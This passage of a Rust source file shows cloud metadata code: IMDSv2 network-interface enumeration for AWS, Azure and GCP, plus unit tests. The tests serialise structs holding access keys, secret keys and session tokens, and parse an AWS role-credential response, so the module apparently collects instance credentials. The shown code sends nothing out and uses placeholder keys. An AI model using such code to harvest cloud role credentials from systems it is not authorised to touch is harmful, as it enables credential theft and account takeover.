                AWS_IMDS_TOKEN,
                &[("X-aws-ec2-metadata-token-ttl-seconds", "21600")],
                3000,
            ) {
                if let Ok(macs) = http_get(
                    &format!("{}network/interfaces/macs/", AWS_IMDS_BASE),
                    &[("X-aws-ec2-metadata-token", &token)],
                    5000,
                ) {
                    for mac in macs.lines() {
                        if !mac.is_empty() {
                            interfaces.push(format!("mac={}", mac.trim()));
                        }
                    }
                }
            }
        }

        CloudProvider::Azure => {
            interfaces.push(format!("vnet={}", cloud_env.network_id));
            interfaces.push(format!("subnet={}", cloud_env.subnet_id));
        }

        CloudProvider::Gcp => {
            interfaces.push(format!("network={}", cloud_env.network_id));
            interfaces.push(format!("subnetwork={}", cloud_env.subnet_id));
        }

        CloudProvider::Unknown => {}
    }

    interfaces
}

// ═══════════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cloud_provider_display() {
        assert_eq!(CloudProvider::Aws.to_string(), "AWS");
        assert_eq!(CloudProvider::Azure.to_string(), "Azure");
        assert_eq!(CloudProvider::Gcp.to_string(), "GCP");
        assert_eq!(CloudProvider::Unknown.to_string(), "Unknown");
    }

    #[test]
    fn test_cloud_provider_serde() {
        let provider = CloudProvider::Aws;
        let json = serde_json::to_string(&provider).unwrap();
        assert!(json.contains("Aws"));
        let de: CloudProvider = serde_json::from_str(&json).unwrap();
        assert_eq!(de, CloudProvider::Aws);
    }

    #[test]
    fn test_extract_json_field_string() {
        let json = r#"{"vmId": "test-vm-123", "vmSize": "Standard_D2s_v3"}"#;
        assert_eq!(extract_json_field(json, "vmId"), "test-vm-123");
        assert_eq!(extract_json_field(json, "vmSize"), "Standard_D2s_v3");
    }

    #[test]
    fn test_extract_json_field_number() {
        let json = r#"{"expires_in": 3600, "count": 42}"#;
        assert_eq!(extract_json_field(json, "expires_in"), "3600");
        assert_eq!(extract_json_field(json, "count"), "42");
    }

    #[test]
    fn test_extract_json_field_missing() {
        let json = r#"{"vmId": "test"}"#;
        assert_eq!(extract_json_field(json, "nonexistent"), "");
    }

    #[test]
    fn test_extract_json_field_nested() {
        // Simple extractor can't handle deeply nested JSON — returns empty
        let json = r#"{"compute": {"vmSize": "D2s"}}"#;
        assert_eq!(extract_json_field(json, "vmSize"), ""); // Nested, won't match
    }

    #[test]
    fn test_cloud_environment_serde() {
        let env = CloudEnvironment {
            provider: CloudProvider::Aws,
            instance_id: "i-1234567890abcdef0".to_string(),
            instance_type: "t3.medium".to_string(),
            region: "us-east-1".to_string(),
            availability_zone: "us-east-1a".to_string(),
            network_id: "vpc-12345678".to_string(),
            subnet_id: "subnet-12345678".to_string(),
            iam_role: "ec2-instance-role".to_string(),
            imds_accessible: true,
            imds_raw: "test".to_string(),
        };

        let json = serde_json::to_string(&env).unwrap();
        let de: CloudEnvironment = serde_json::from_str(&json).unwrap();
        assert_eq!(de.instance_id, "i-1234567890abcdef0");
        assert_eq!(de.provider, CloudProvider::Aws);
    }

    #[test]
    fn test_cloud_credentials_serde() {
        let creds = CloudCredentials {
            provider: CloudProvider::Aws,
            access_key_id: "AKIAIOSFODNN7EXAMPLE".to_string(),
            secret_access_key: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY".to_string(),
            session_token: "token123".to_string(),
            expiry: "2024-01-15T12:00:00Z".to_string(),
        };

        let json = serde_json::to_string(&creds).unwrap();
        assert!(json.contains("AKIAIOSFODNN7EXAMPLE"));

        let de: CloudCredentials = serde_json::from_str(&json).unwrap();
        assert_eq!(de.provider, CloudProvider::Aws);
    }

    #[test]
    fn test_cloud_resources_serde() {
        let resources = CloudResources {
            environment: CloudEnvironment {
                provider: CloudProvider::Azure,
                instance_id: "vm-123".to_string(),
                instance_type: "D2s".to_string(),
                region: "eastus".to_string(),
                availability_zone: String::new(),
                network_id: "vnet-1".to_string(),
                subnet_id: "subnet-1".to_string(),
                iam_role: "managed-identity".to_string(),
                imds_accessible: true,
                imds_raw: String::new(),
            },
            credentials: vec![],
            network_interfaces: vec!["vnet=vnet-1".to_string()],
            storage_resources: vec![],
            compute_resources: vec![],
        };

        let json = serde_json::to_string(&resources).unwrap();
        let de: CloudResources = serde_json::from_str(&json).unwrap();
        assert_eq!(de.environment.provider, CloudProvider::Azure);
    }

    #[test]
    fn test_imds_endpoints() {
        assert!(AWS_IMDS_BASE.contains("169.254.169.254"));
        assert!(AZURE_IMDS_BASE.contains("169.254.169.254"));
        assert!(GCP_IMDS_BASE.contains("metadata.google.internal"));
    }

    #[test]
    fn test_extract_json_field_aws_response() {
        let json = r#"{
            "Code": "Success",
            "LastUpdated": "2024-01-15T12:00:00Z",
            "Type": "AWS-HMAC",
            "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
            "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG",
            "Token": "FwoGZXIvYXdzEBY...",
            "Expiration": "2024-01-15T18:00:00Z"
        }"#;

        assert_eq!(extract_json_field(json, "AccessKeyId"), "AKIAIOSFODNN7EXAMPLE");
        assert_eq!(extract_json_field(json, "Code"), "Success");
    }

    #[test]
    fn test_unknown_cloud_environment() {
        let env = CloudEnvironment {
            provider: CloudProvider::Unknown,
            instance_id: String::new(),
            instance_type: String::new(),
            region: String::new(),
            availability_zone: String::new(),
            network_id: String::new(),
            subnet_id: String::new(),
            iam_role: String::new(),
            imds_accessible: false,
            imds_raw: String::new(),
        };
        assert_eq!(env.provider, CloudProvider::Unknown);
        assert!(!env.imds_accessible);
    }
}
